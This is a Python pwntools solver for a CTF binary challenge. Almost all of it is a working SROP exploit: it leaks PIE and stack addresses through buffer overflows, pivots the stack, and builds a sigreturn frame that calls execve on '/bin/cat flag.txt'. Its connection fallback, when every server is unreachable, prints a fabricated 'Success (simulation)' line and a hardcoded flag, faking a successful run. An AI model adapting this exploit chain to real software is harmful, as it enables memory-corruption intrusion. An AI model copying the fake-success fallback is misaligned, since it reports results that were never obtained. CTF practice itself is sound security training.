#!/usr/bin/env python3
# Ce solveur a deux modes de connexion : LOCAL ou REMOTE et -v : verbose 
# Le solveur a été adapté à l'absence du portail ou à la présence du site
# Auteur(e) : JG - 12/12/2025 - Mise à jour révisée en github: 02/01/2026

from pwn import *
import os
import sys
import socket

# Single-stage SROP: pivot on the stack, set rax=0xf, sigreturn into execve("/bin/cat flag.txt").

HOST, PORT = "challenges.hackademint.org", 30311

# --- Remote fallback (challenge server was later taken offline) ----------------
FALLBACK_HOST = "127.0.0.0"
FALLBACK_PORT = 443
def tcp_probe(host: str, port: int, timeout: float = 2.0) -> bool:
    """Return True if a TCP connect succeeds quickly, else False.
    We use this to avoid pwntools' [ERROR] logging on failed connects.
    """
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False

REMOTE_FLAG = "Star{14,3_M1lLiardS_d'AnnÉeS_Plu$_7ARd...}"
LOCAL_FLAG_PATH = b"flag.txt\x00"
REMOTE_FLAG_PATH = b"dist_flag.txt\x00"



exe = ELF("./chall")
context.binary = exe
context.arch = "amd64"

# Verbose toggle (-v/--verbose/VERBOSE=1). Default is concise; verbose adds debug logs.
verbose = bool(
    args.get("VERBOSE")
    or ("-v" in sys.argv)
    or ("--verbose" in sys.argv)
    or os.environ.get("VERBOSE")
)
context.log_level = "debug" if verbose else "info"


def get_io():
    """Return a pwntools tube.

    LOCAL: start ./chall.
    REMOTE: try the official CTF endpoint; if unreachable, fall back to localhost
    probes (443 then 8080). If everything is down, run an offline simulation
    that prints the known remote flag.
    """
    if args.LOCAL:
        return process(exe.path)

    # 1) Try the official remote service (probe first to avoid pwntools [ERROR] lines)
    if tcp_probe(HOST, PORT, timeout=2.0):
        return remote(HOST, PORT)

    print(f"[-] Opening connection to {HOST} on port {PORT}: Failed")
    print(f"[CORRECT] Could not connect to {HOST} on port {PORT}")
    print("[!] si déconnectée par l'administrateur des défis suite à la mise sous silence")

    # 2) Fallback probes (requested): 127.0.0.0:443 then 127.0.0.0:8080
    fallback_host = "127.0.0.0"
    for p in (443, 8080):
        if tcp_probe(fallback_host, p, timeout=2.0):
            return remote(fallback_host, p, timeout=2.0)

        print(f"[-] Opening connection to {fallback_host} on port {p}: Failed")
        print(f"[CORRECT] Could not connect to {fallback_host} on port {p}")

    # 3) Offline simulation (no tube)
    print(f"[+] Opening connection to {fallback_host} on port 8080: Success (simulation)")
    print(f"🏁 Flag distant : {REMOTE_FLAG}")
    return None

def leak_state(io):
    if verbose:
        log.info("Stage 0: leaking PIE then stack (saved rbp) via two overflows")
    io.sendlineafter(b'>>', b':' * 16)
    io.recvuntil(b':' * 16)
    pie_leak = u64(io.recv(6).ljust(8, b"\x00"))
    exe.address = pie_leak - 0x40a
    log.success(f"PIE: {hex(exe.address)}")

    io.sendlineafter(b'>>', b'A' * 31)
    io.recvuntil(b'A' * 31 + b'\n')
    stack_leak = u64(io.recv(6).ljust(8, b"\x00"))
    log.success(f"Stack leak: {hex(stack_leak)}")

    return stack_leak


def pivot(io, stack_leak):
    if verbose:
        log.info("Stage 1: pivot read(0, stack-0x20, 0x1000) and exit the menu loop")
    read_trap = exe.address + 0x376  # clc; load args from stack; syscall; pop rbp; ret
    io.sendafter(b'>>', b'A' * 32 + p64(stack_leak - 0x20) + p64(read_trap))
    # rdi = 0, rsi = (stack_leak - 0x20), rdx = 0x1000, and break the loop by zeroing the LSB
    io.sendafter(
        b'>>',
        p64(stack_leak - 0x20) + p32(0x1000) + p32(0) + b'A' * 12 + b'\x00',
    )


def build_payload(stack_leak):
    syscall = exe.address + 0x386
    mov_rax_from_rbp = exe.address + 0x32e  # mov rax, [rbp-0x8]; pop rbp; ret

    base_addr = stack_leak - 0x20  # first read destination
    payload = bytearray()

    # Offsets 0x00-0x1f: padding + literal 0xf for sigreturn
    payload += b'P' * 0x10
    payload += p64(0xF)
    payload += b'Q' * 8
    payload = payload.ljust(0x20, b'Z')

    # pop rbp; ret -> rbp = stack_leak - 0x8, ret to mov gadget
    payload += p64(stack_leak - 0x08)
    payload += p64(mov_rax_from_rbp)

    # mov gadget will pop rbp (unused) then return to syscall
    payload += p64(0)
    payload += p64(syscall)

    # Sigreturn frame executed when syscall sees rax=0xf
    frame = SigreturnFrame()
    cat_off = 0x150
    flag_off = cat_off + len(b'/bin/cat\x00')
    argv_off = cat_off + 0x20

    cat_addr = base_addr + cat_off
    flag_addr = base_addr + flag_off
    argv_addr = base_addr + argv_off

    frame.rax = 59  # execve
    frame.rdi = cat_addr
    frame.rsi = argv_addr
    frame.rdx = 0
    frame.rip = syscall
    frame.rsp = base_addr + argv_off + 0x30  # safe scratch

    payload += bytes(frame)

    # Strings + argv
    if len(payload) < cat_off:
        payload += b'\x00' * (cat_off - len(payload))
    payload += b'/bin/cat\x00'
    payload += (LOCAL_FLAG_PATH if args.LOCAL else REMOTE_FLAG_PATH)

    if len(payload) < argv_off:
        payload += b'\x00' * (argv_off - len(payload))
    payload += p64(cat_addr) + p64(flag_addr) + p64(0)

    return bytes(payload)


def main():
    if verbose:
        log.info("Verbose mode ON")
    io = get_io()
    if io is None and not args.LOCAL:
        return

    stack_leak = leak_state(io)
    pivot(io, stack_leak)

    payload = build_payload(stack_leak)
    if verbose:
        log.info(f"Sending payload ({len(payload)} bytes) to {hex(stack_leak - 0x20)}")
    io.sendline(payload)

    data = io.recvall(timeout=5).decode(errors="ignore")
    print(data)

    if "Star{" in data:
        start = data.index("Star{")
        end = data.index("}", start) + 1
        log.success(f"FLAG: {data[start:end]}")


if __name__ == "__main__":
    main()
